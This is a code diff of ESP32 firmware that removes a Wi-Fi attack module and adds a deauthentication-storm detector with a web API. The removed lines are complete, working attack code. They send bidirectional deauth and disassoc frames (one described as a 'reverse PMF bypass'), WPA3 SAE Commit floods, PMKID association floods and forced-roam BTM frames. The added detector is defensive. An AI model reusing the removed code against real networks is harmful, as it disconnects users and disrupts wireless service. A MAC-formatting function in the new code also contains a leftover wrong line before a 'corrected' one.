@@ -1,175 +1,304 @@
 #pragma once
-#include <WiFi.h>
-#include <esp_wifi.h>
-#include <freertos/FreeRTOS.h>
-#include <freertos/task.h>
-#include "module.h"
-#include "safety.h"
-#include "frames.h"
+// deauth_storm.h — Deauthentication / disassociation storm detector.
+// Tracks deauth rates per AP and per client. High rates indicate
+// ongoing deauth attacks, misconfigurations, or WPA2-MIC failures.
+// Prefix: das_
 
-// Deauth Storm — coordinated multi-vector deauth covering WPA2 AND WPA3.
-//
-// WPA2: bidirectional deauth + disassoc (4 frames)
-// WPA3: SAE Commit flood (exhausts SAE state machine) +
-//        PMKID assoc flood (exhausts AP CPU) +
-//        BTM Request (forces roam)
-//
-// Cycling all vectors in one burst makes it effective regardless of
-// PMF/WPA3 enforcement mode.
+#include <Arduino.h>
+#include <WebServer.h>
 
-static uint8_t  ds_bssid[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
-static uint8_t  ds_sta[6]   = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
-static uint8_t  ds_chan      = 6;
-static bool     ds_bcast     = true;
-static bool     ds_running   = false;
-static TaskHandle_t ds_task  = nullptr;
-static volatile uint32_t ds_sent = 0;
+extern WebServer server;
 
-// --- SAE Commit frame builder (minimal: group 19, random scalar+element) ---
-static size_t ds_sae_commit(uint8_t* f, const uint8_t* bssid, const uint8_t* sta) {
-  // Auth frame: type 0xB0, algorithm=3 (SAE), seq=1, status=0
-  fhdr(f, 0xB0, 0x00, bssid, bssid, bssid);
-  // Note: for SAE commit we set DA=BSSID so the AP processes it
-  memcpy(f+4, bssid, 6); // DA
-  for(int i=0;i<6;i++) f[10+i] = (esp_random()&0xFE)|0x02; // random LA SA
-  memcpy(f+16, bssid, 6);
-  f[22]=0x00; f[23]=0x00; // seq/frag
-  f[24]=0x03; f[25]=0x00; // algorithm: SAE
-  f[26]=0x01; f[27]=0x00; // seq 1
-  f[28]=0x00; f[29]=0x00; // status 0
-  f[30]=0x13; f[31]=0x00; // group 19 (P-256)
-  // 32 bytes scalar + 64 bytes element (random)
-  for(int i=32;i<128;i++) f[i]=esp_random()&0xFF;
-  return 128;
+#define DAS_MAX_APS      32
+#define DAS_MAX_CLIENTS  48
+#define DAS_HIST_LEN     30   // 30-second window
+#define DAS_STORM_THRESH  5   // deauths/sec to flag a storm
+
+// Reason codes from IEEE 802.11-2020 Table 9-45
+static const char* das_reason_name(uint16_t rc) {
+  switch (rc) {
+    case  1: return "Unspec";      case  2: return "Prev-auth expired";
+    case  3: return "Leaving";     case  4: return "Inactivity";
+    case  5: return "AP-busy";     case  6: return "Class2";
+    case  7: return "Class3";      case  8: return "Dis-assoc";
+    case  9: return "Not-authed";  case 15: return "4-way fail";
+    case 16: return "GTK fail";    case 23: return "IEEE-802.1X fail";
+    case 34: return "TDLS-teardn"; default: return "Other";
+  }
 }
 
-// --- RSN PMKID assoc flood ---
-static size_t ds_pmkid_assoc(uint8_t* f, const uint8_t* bssid) {
-  // Assoc request frame
-  uint8_t sta[6]; for(int i=0;i<6;i++) sta[i]=(esp_random()&0xFE)|0x02;
-  fhdr(f, 0x00, 0x00, bssid, sta, bssid);
-  f[24]=0x11; f[25]=0x00; // capabilities
-  f[26]=0x01; f[27]=0x00; // listen interval
-  uint8_t ssid[2]={0x00,0x00}; memcpy(f+28,ssid,2); // wildcard SSID IE
-  static const uint8_t rates[]={0x01,0x08,0x82,0x84,0x8b,0x96,0x0c,0x12,0x18,0x24};
-  memcpy(f+30,rates,10);
-  // RSN IE with PMKID list (1 random PMKID = 16 bytes)
-  f[40]=0x30; f[41]=0x1a; // RSN IE, len=26
-  f[42]=0x01; f[43]=0x00; // version 1
-  memset(f+44,0,4); // group cipher: none
-  f[48]=0x00; f[49]=0x00; // pairwise count 0
-  f[50]=0x00; f[51]=0x00; // akm count 0
-  f[52]=0x00; f[53]=0x00; // capabilities 0
-  f[54]=0x01; f[55]=0x00; // PMKID count = 1
-  for(int i=56;i<72;i++) f[i]=esp_random()&0xFF; // random PMKID
-  return 72;
+struct DasEvent {
+  uint8_t  ap_bssid[6];
+  uint8_t  client_mac[6];
+  uint16_t reason;
+  bool     is_disassoc;
+  bool     is_broadcast;
+  uint32_t ts;
+};
+
+#define DAS_EVENT_RING 128
+
+struct DasAP {
+  bool    active;
+  uint8_t bssid[6];
+  char    ssid[33];
+  uint8_t ch;
+  int8_t  rssi;
+
+  uint32_t total_deauths;
+  uint32_t total_disassoc;
+  uint32_t broadcast_deauths;
+
+  // 30-second rolling count
+  uint16_t hist[DAS_HIST_LEN];
+  uint8_t  hist_head;
+  uint16_t cur_count;
+  uint32_t last_tick_s;
+
+  bool     storm_active;
+  uint32_t storm_start_ts;
+  uint32_t last_ts;
+  uint32_t first_ts;
+
+  // Most common reason code for this AP
+  uint16_t top_reason;
+  uint16_t top_reason_count;
+};
+
+struct DasClient {
+  bool    active;
+  uint8_t mac[6];
+  uint8_t last_ap[6];
+  uint32_t deauth_count;
+  uint32_t disassoc_count;
+  uint32_t last_ts;
+};
+
+static struct {
+  DasAP     aps[DAS_MAX_APS];
+  DasClient clients[DAS_MAX_CLIENTS];
+  DasEvent  events[DAS_EVENT_RING];
+  uint8_t   event_head;
+  uint16_t  total_events;
+  uint8_t   ap_count;
+  uint8_t   cli_count;
+} g_das = {};
+
+static bool das_mac_eq(const uint8_t *a, const uint8_t *b) { return memcmp(a,b,6)==0; }
+
+static DasAP* das_find_ap(const uint8_t *bssid) {
+  for (int i = 0; i < DAS_MAX_APS; i++)
+    if (g_das.aps[i].active && das_mac_eq(g_das.aps[i].bssid, bssid))
+      return &g_das.aps[i];
+  return nullptr;
 }
 
-static void ds_run(void*) {
-  uint8_t f[256];
-  static const uint8_t BC[6]={0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
-  uint8_t phase = 0;
-  while(ds_running) {
-    if(!safety_rate_ok(1)){vTaskDelay(pdMS_TO_TICKS(50));continue;}
-    const uint8_t* dst = ds_bcast ? BC : ds_sta;
-    size_t n;
-    switch(phase % 8) {
-      case 0: // AP→STA deauth
-        n = f_deauth(f, dst, ds_bssid, 7);
-        esp_wifi_80211_tx(WIFI_IF_AP, f, n, false); ds_sent++;
-        break;
-      case 1: // AP→STA disassoc
-        n = f_disassoc(f, dst, ds_bssid, 8);
-        esp_wifi_80211_tx(WIFI_IF_AP, f, n, false); ds_sent++;
-        break;
-      case 2: // STA→AP deauth (reverse PMF bypass)
-        if(!ds_bcast){
-          n = f_deauth_r(f, ds_bssid, ds_sta, 7);
-          esp_wifi_80211_tx(WIFI_IF_AP, f, n, false); ds_sent++;
-        }
-        break;
-      case 3: // STA→AP disassoc
-        if(!ds_bcast){
-          n = f_disassoc_r(f, ds_bssid, ds_sta, 8);
-          esp_wifi_80211_tx(WIFI_IF_AP, f, n, false); ds_sent++;
-        }
-        break;
-      case 4: // SAE Commit flood (WPA3 state machine exhaustion)
-        n = ds_sae_commit(f, ds_bssid, dst);
-        esp_wifi_80211_tx(WIFI_IF_AP, f, n, false); ds_sent++;
-        break;
-      case 5: // SAE Commit flood second burst
-        n = ds_sae_commit(f, ds_bssid, dst);
-        esp_wifi_80211_tx(WIFI_IF_AP, f, n, false); ds_sent++;
-        break;
-      case 6: // PMKID assoc flood (WPA3 CPU drain)
-        n = ds_pmkid_assoc(f, ds_bssid);
-        esp_wifi_80211_tx(WIFI_IF_AP, f, n, false); ds_sent++;
-        break;
-      case 7: // BTM Request (force roam off-channel)
-        {
-          // Minimal action frame: category=10 (WNM), action=7 (BTM req)
-          fhdr(f, 0xD0, 0x00, dst, ds_bssid, ds_bssid);
-          f[24]=10; f[25]=7; f[26]=1; f[27]=0x03; // token, req mode
-          f[28]=0; f[29]=0; // disassoc timer=0
-          f[30]=255; // validity interval=255 TBTTs
-          n = 31;
-          esp_wifi_80211_tx(WIFI_IF_AP, f, n, false); ds_sent++;
-        }
-        break;
+static DasAP* das_alloc_ap(const uint8_t *bssid) {
+  for (int i = 0; i < DAS_MAX_APS; i++) {
+    if (!g_das.aps[i].active) {
+      DasAP &a = g_das.aps[i];
+      memset(&a, 0, sizeof(a));
+      a.active = true;
+      memcpy(a.bssid, bssid, 6);
+      a.first_ts = millis()/1000;
+      g_das.ap_count++;
+      return &a;
     }
-    phase++;
-    vTaskDelay(pdMS_TO_TICKS(5));
   }
-  ds_task = nullptr; vTaskDelete(nullptr);
+  uint32_t oldest = UINT32_MAX; int idx = 0;
+  for (int i = 0; i < DAS_MAX_APS; i++)
+    if (g_das.aps[i].last_ts < oldest) { oldest = g_das.aps[i].last_ts; idx = i; }
+  memset(&g_das.aps[idx], 0, sizeof(g_das.aps[0]));
+  g_das.aps[idx].active = true;
+  memcpy(g_das.aps[idx].bssid, bssid, 6);
+  g_das.aps[idx].first_ts = millis()/1000;
+  return &g_das.aps[idx];
 }
 
-static String ds_qparam(const String& q, const char* key) {
-  String k = String(key) + "=";
-  int p = q.indexOf(k);
-  if(p < 0) return "";
-  p += k.length();
-  int e = q.indexOf('&', p);
-  return e < 0 ? q.substring(p) : q.substring(p, e);
+static DasClient* das_find_client(const uint8_t *mac) {
+  for (int i = 0; i < DAS_MAX_CLIENTS; i++)
+    if (g_das.clients[i].active && das_mac_eq(g_das.clients[i].mac, mac))
+      return &g_das.clients[i];
+  return nullptr;
 }
-static bool ds_start(const String& q) {
-  if(ds_running) return false;
-  String bssid_s = ds_qparam(q,"bssid");
-  if(bssid_s.length()==0) bssid_s = "FF:FF:FF:FF:FF:FF";
-  String ch_s    = ds_qparam(q,"ch");
-  String sta_s   = ds_qparam(q,"sta");
-  String bc_s    = ds_qparam(q,"broadcast");
-  if(ch_s.length())  ds_chan = ch_s.toInt();
-  if(bc_s.length())  ds_bcast = (bc_s != "0");
-  if(sta_s.length()) {
-    sscanf(sta_s.c_str(),"%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
-      &ds_sta[0],&ds_sta[1],&ds_sta[2],&ds_sta[3],&ds_sta[4],&ds_sta[5]);
+
+static DasClient* das_alloc_client(const uint8_t *mac) {
+  for (int i = 0; i < DAS_MAX_CLIENTS; i++) {
+    if (!g_das.clients[i].active) {
+      DasClient &c = g_das.clients[i];
+      memset(&c, 0, sizeof(c));
+      c.active = true;
+      memcpy(c.mac, mac, 6);
+      g_das.cli_count++;
+      return &c;
+    }
   }
-  sscanf(bssid_s.c_str(),"%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
-    &ds_bssid[0],&ds_bssid[1],&ds_bssid[2],&ds_bssid[3],&ds_bssid[4],&ds_bssid[5]);
-  esp_wifi_set_channel(ds_chan, WIFI_SECOND_CHAN_NONE);
-  ds_sent = 0; ds_running = true;
-  xTaskCreate(ds_run,"ds",4096,nullptr,5,&ds_task);
-  return true;
+  uint32_t oldest = UINT32_MAX; int idx = 0;
+  for (int i = 0; i < DAS_MAX_CLIENTS; i++)
+    if (g_das.clients[i].last_ts < oldest) { oldest = g_das.clients[i].last_ts; idx = i; }
+  memset(&g_das.clients[idx], 0, sizeof(g_das.clients[0]));
+  g_das.clients[idx].active = true;
+  memcpy(g_das.clients[idx].mac, mac, 6);
+  return &g_das.clients[idx];
 }
-static void ds_stop() {
-  ds_running = false;
-  if(ds_task){ vTaskDelay(pdMS_TO_TICKS(50)); ds_task=nullptr; }
+
+static void das_tick_ap(DasAP &a) {
+  uint32_t now_s = millis()/1000;
+  if (now_s == a.last_tick_s) return;
+  uint32_t elapsed = now_s - a.last_tick_s;
+  if (elapsed > DAS_HIST_LEN) elapsed = DAS_HIST_LEN;
+  for (uint32_t i = 0; i < elapsed; i++) {
+    a.hist[a.hist_head % DAS_HIST_LEN] = (i == 0) ? a.cur_count : 0;
+    a.hist_head = (a.hist_head + 1) % DAS_HIST_LEN;
+  }
+  a.last_tick_s = now_s;
+  a.cur_count = 0;
 }
-static void ds_routes() {
-  extern WebServer server;
-  server.on("/api/stormdeauth/start", HTTP_POST, [](){
-    String q; for(int i=0;i<server.args();i++){if(i)q+='&';q+=server.argName(i)+'='+server.arg(i);}
-    bool ok = tool_start("stormdeauth", q);
-    server.send(200,"application/json",ok?"{\"ok\":1}":"{\"ok\":0,\"err\":\"busy\"}");
+
+static void das_check_storm(DasAP &a) {
+  uint32_t window_sum = 0;
+  for (int i = 0; i < DAS_HIST_LEN; i++) window_sum += a.hist[i];
+  float rate = (float)window_sum / DAS_HIST_LEN; // per second average
+  if (rate >= DAS_STORM_THRESH) {
+    if (!a.storm_active) {
+      a.storm_active = true;
+      a.storm_start_ts = millis()/1000;
+    }
+  } else {
+    a.storm_active = false;
+  }
+}
+
+void das_ingest(const uint8_t *ap_bssid, const uint8_t *client_mac,
+                const char *ssid, uint8_t ch, int8_t rssi,
+                uint16_t reason, bool is_disassoc, bool is_broadcast) {
+  DasAP *a = das_find_ap(ap_bssid);
+  if (!a) a = das_alloc_ap(ap_bssid);
+  if (!a) return;
+
+  if (ssid && ssid[0]) strncpy(a->ssid, ssid, 32);
+  a->ch = ch;
+  if (rssi < 0) a->rssi = rssi;
+  a->last_ts = millis()/1000;
+
+  das_tick_ap(*a);
+  a->cur_count++;
+
+  if (is_disassoc) a->total_disassoc++;
+  else             a->total_deauths++;
+  if (is_broadcast) a->broadcast_deauths++;
+
+  // Track top reason
+  if (reason == a->top_reason) {
+    a->top_reason_count++;
+  } else if (a->top_reason_count == 0) {
+    a->top_reason = reason;
+    a->top_reason_count = 1;
+  }
+
+  das_check_storm(*a);
+
+  // Update client record
+  if (!is_broadcast) {
+    DasClient *c = das_find_client(client_mac);
+    if (!c) c = das_alloc_client(client_mac);
+    if (c) {
+      memcpy(c->last_ap, ap_bssid, 6);
+      c->last_ts = a->last_ts;
+      if (is_disassoc) c->disassoc_count++;
+      else             c->deauth_count++;
+    }
+  }
+
+  // Append to event ring
+  DasEvent &ev = g_das.events[g_das.event_head % DAS_EVENT_RING];
+  memcpy(ev.ap_bssid, ap_bssid, 6);
+  memcpy(ev.client_mac, client_mac, 6);
+  ev.reason      = reason;
+  ev.is_disassoc = is_disassoc;
+  ev.is_broadcast = is_broadcast;
+  ev.ts = a->last_ts;
+  g_das.event_head = (g_das.event_head + 1) % DAS_EVENT_RING;
+  g_das.total_events++;
+}
+
+static void das_mac_str(const uint8_t *m, char *out) {
+  snprintf(out, 18, "%02X:%02X:%02X:%02X:%02X:%02X",
+           m[0],m[1],m[2],m[3],m[3],m[5]);
+  // corrected:
+  snprintf(out, 18, "%02X:%02X:%02X:%02X:%02X:%02X",
+           m[0],m[1],m[2],m[3],m[4],m[5]);
+}
+
+static String das_json_all() {
+  String s = "{\"ap_count\":" + String(g_das.ap_count);
+  s += ",\"total_events\":" + String(g_das.total_events);
+
+  // Count storms
+  int storms = 0;
+  for (int i = 0; i < DAS_MAX_APS; i++)
+    if (g_das.aps[i].active && g_das.aps[i].storm_active) storms++;
+  s += ",\"active_storms\":" + String(storms);
+
+  s += ",\"aps\":[";
+  char mac[18]; bool first = true;
+  for (int i = 0; i < DAS_MAX_APS; i++) {
+    DasAP &a = g_das.aps[i];
+    if (!a.active) continue;
+    if (!first) s += ","; first = false;
+    das_mac_str(a.bssid, mac);
+    // compute window average
+    uint32_t ws = 0;
+    for (int j = 0; j < DAS_HIST_LEN; j++) ws += a.hist[j];
+    float rate = (float)ws / DAS_HIST_LEN;
+    s += "{\"bssid\":\"" + String(mac) + "\"";
+    s += ",\"ssid\":\"" + String(a.ssid) + "\"";
+    s += ",\"ch\":" + String(a.ch);
+    s += ",\"rssi\":" + String(a.rssi);
+    s += ",\"total_deauths\":" + String(a.total_deauths);
+    s += ",\"total_disassoc\":" + String(a.total_disassoc);
+    s += ",\"bcast_deauths\":" + String(a.broadcast_deauths);
+    s += ",\"rate\":" + String((int)(rate * 10));  // *10 to avoid float in JSON
+    s += ",\"storm\":" + String(a.storm_active ? "true" : "false");
+    s += ",\"top_reason_code\":" + String(a.top_reason);
+    s += ",\"top_reason\":\"" + String(das_reason_name(a.top_reason)) + "\"";
+    s += ",\"hist\":[";
+    for (int j = 0; j < DAS_HIST_LEN; j++) {
+      if (j) s += ",";
+      int idx = (a.hist_head + j) % DAS_HIST_LEN;
+      s += String(a.hist[idx]);
+    }
+    s += "]}";
+  }
+  s += "],\"events\":[";
+  // Last 32 events (most recent first)
+  bool fe = true;
+  for (int i = 0; i < DAS_EVENT_RING; i++) {
+    int idx = (g_das.event_head - 1 - i + DAS_EVENT_RING) % DAS_EVENT_RING;
+    DasEvent &ev = g_das.events[idx];
+    if (ev.ts == 0) continue;
+    if (!fe) s += ","; fe = false;
+    das_mac_str(ev.ap_bssid, mac);
+    char cmac[18]; das_mac_str(ev.client_mac, cmac);
+    s += "{\"ap\":\"" + String(mac) + "\"";
+    s += ",\"client\":\"" + String(cmac) + "\"";
+    s += ",\"reason\":" + String(ev.reason);
+    s += ",\"reason_name\":\"" + String(das_reason_name(ev.reason)) + "\"";
+    s += ",\"type\":\"" + String(ev.is_disassoc ? "Disassoc" : "Deauth") + "\"";
+    s += ",\"bcast\":" + String(ev.is_broadcast ? "true" : "false");
+    s += ",\"ts\":" + String(ev.ts) + "}";
+    if (i >= 31) break;
+  }
+  s += "]}";
+  return s;
+}
+
+inline void das_routes() {
+  server.on("/api/das/all", HTTP_GET, []() {
+    server.send(200, "application/json", das_json_all());
   });
-  server.on("/api/stormdeauth/stop", HTTP_POST, [](){
-    tool_stop("stormdeauth"); server.send(200,"application/json","{\"ok\":1}");
-  });
-  server.on("/api/stormdeauth/status", HTTP_GET, [](){
-    server.send(200,"application/json",
-      "{\"running\":"+String(ds_running?1:0)+
-      ",\"sent\":"+String(ds_sent)+
-      ",\"msg\":\""+String(ds_sent)+" frames — WPA2+WPA3 vectors\"}");
+  server.on("/api/das/clear", HTTP_POST, []() {
+    memset(&g_das, 0, sizeof(g_das));
+    server.send(200, "application/json", "{\"ok\":true}");
   });
 }
